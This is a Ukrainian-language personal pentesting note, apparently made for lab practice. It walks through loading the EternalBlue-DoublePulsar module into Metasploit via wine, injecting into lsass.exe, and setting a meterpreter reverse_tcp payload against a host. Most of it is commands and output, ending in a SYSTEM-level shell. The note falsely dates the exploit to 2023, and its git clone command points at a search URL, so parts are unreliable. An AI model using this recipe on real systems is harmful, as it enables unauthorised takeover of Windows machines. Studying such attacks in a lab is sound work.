---
title: "Double pulsar Attack -експлойт Windows"
category: "pentesting"
tags: ['blue', 'експлойт', 'установки', 'eternalblue', 'фреймворк']
status: "published"
created: "2026-03-24"
updated: "2026-03-24"
ai-processed: false
source: "manual"
quality: 1
related-files: []
---


1  ----------
2 Звязки :  [[вразливості Windows]] , [[Eternal Blue Attack  (eternalblue)]]
3 Теги : [[Double pulsar Attack -експлойт Windows]]

це новий експлойт випущений в 2023 р і потребує установки в фреймворк метасплоіт
 для цього встановлюєм wine - програму для виконання програм віндовса на лінуксі:
sudo apt install wine

це все робиться для того щоб отримати каталог wine диску С:
Щоб побачити цей каталог потрібно встановити будь-яку маленьку програму на віндовс, зокрема у цьому прикладі установимо piton2, не тому що він потрібен а щоб бачити каталог wine:
-завантажую версію з інтернету і відкриваю термінал в каталозі завантажень. 
далі :
wine msiexec /i python-2.7.18.amd64.msi

після установки заходжу в кореневий розділ 
cd /root 
каталог wine являється скритим тому щоб його побачити треба набрати:
ls -la
заходжу в нього ш дивлюся:cd .wine 
cd .wine 
ls -la
де я бачу каталог драйверів диску С: -
drwxr-xr-x 8 root root    4096 Jan 22 04:06 drive_c

## тепер можна приступити до завантаження експлойту:
в браузері набираю :

eternalblue  doublepulsar
вибираю вкладку :
[

### Telefonica/Eternalblue-Doublepulsar-Metasploit

копіюю вкладку :

https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit
 в терміналі (кращу в червоному)проходжу шлях до робочого стола 
cd /home/kali/Desktop/
і набираю команду :
git clone  https://www.google.com/search?client=firefox-b-e&q=eternalblue++doublepulsar 
після установки заходжу в :
Eternalblue-Doublepulsar-Metasploit/
 роблю:
 ls
 і копіюю два файли в метасплоіт фреймворк :
 cp deps /usr/share/metasploit-framework/modules/exploits/windows/smb -r
cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
ще раз копіюємо ці оба файли в кореневий каталог:
cp deps /root -r
cp eternalblue_doublepulsar.rb /root/
 відкриваємо консоль фреймворку:
 msfconsole
 в якому переходимо до експлоіту Eternalblue-Doublepulsar :
use exploit/windows/smb/eternalblue_doublepulsar 
## тепер експлоіт імпортовано в метасполоіе фреймворк
далі по стандартній схемі:
-дивимось шнформацію по експлойту :
show info
-дивимося варіанти:
show options
бачу що всі регістри обовязкові до заповнення , але їх треба буде дещо міняти  але допущена помилка бо скопійовано весь файл повністю.
заходжу в новий термінал і заходжу в кореневий термінал:
sudo su
заходжу на робочий стіл акаунту(kali)
/home/kali/Desktop/
ls
і копіюю в кореневий каталог Eternalblue-Doublepulsar-Metasploit командою:
cp Eternalblue-Doublepulsar-Metasploit/ /root -r

і повертаюсь до виконання типової інструкції, тобто в фрейм метасплоіт ще раз повторюю команду 

show options
і міняю імя процесу в стрічці   PROCESSINJECT       wlms.exe                             yes       Name of process to inject into (Change to lsass.exe for x64)
із **wlms.exe**  на **lsass.exe** 
командою:
set PROCESSINJECT lsass.exe 
далі ввожу ІР хосту:
set RHOSTS 192.168.1.77

установлюю цільову архітектуру TARGETARCHITECTURE із **x86** на  x64
set TARGETARCHITECTURE x64

тепер установлюємо (винний шлях)  WINEPATH (ця вся хуйня танцювалась заради цієї установки)
але він вже установлений правильно в результаті танців з бубнами:

 WINEPATH            /root/.wine/drive_c/ 
залишилось зробити ще одну конфігурацію (встановити корисну нагрузку): Payload options (windows/meterpreter/reverse_tcp):
set payload windows/x64/meterpreter/reverse_tcp
далі:
show options
можна подивитися всі цілі для атаки:
show targets

запускаємо:
run
eксплоіт запущено я бачу :meterpreter > 
можна ввести оболонку shell  і зайти в командну строку:
shell
і спитавши хто я 
C:\Windows\system32>whoami
whoami
nt authority\���⥬�
я отримую обліковий запис найвищого рівня для віндовс: - nt authority


C:\Windows\system32>


кіно тут:
https://www.youtube.com/watch?v=UCdwVhQfpxg&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=56